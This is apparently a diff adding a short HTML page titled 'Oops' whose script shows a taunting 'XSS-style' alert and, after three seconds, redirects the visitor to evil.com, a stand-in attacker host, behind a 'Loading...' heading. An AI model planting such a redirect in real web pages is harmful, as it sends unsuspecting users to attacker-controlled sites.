@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Oops</title>
+  <script>
+    // Trigger XSS-style alert
+    alert("Oops, guess your luck ran out. That’s unfortunate... for you. 😈");
+
+    // Redirect after 3 seconds
+    setTimeout(() => {
+      window.location.href = "https://evil.com";
+    }, 3000);
+  </script>
+</head>
+<body>
+  <h1>Loading...</h1>
+</body>
+</html>
